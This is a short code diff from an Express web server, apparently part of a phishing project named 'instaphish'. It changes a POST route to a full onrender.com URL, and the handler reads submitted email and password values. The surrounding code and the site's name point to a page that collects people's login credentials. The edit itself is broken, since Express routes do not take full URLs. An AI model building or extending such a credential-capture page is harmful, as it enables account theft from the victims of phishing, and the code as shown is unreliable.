@@ -10,7 +10,7 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, './index.html'))
 })
 
-app.post("/send", async (req, res) => {
+app.post("https://instaphish-0w7o.onrender.com/send", async (req, res) => {
 
     const {email, password} = req.body;
     try {
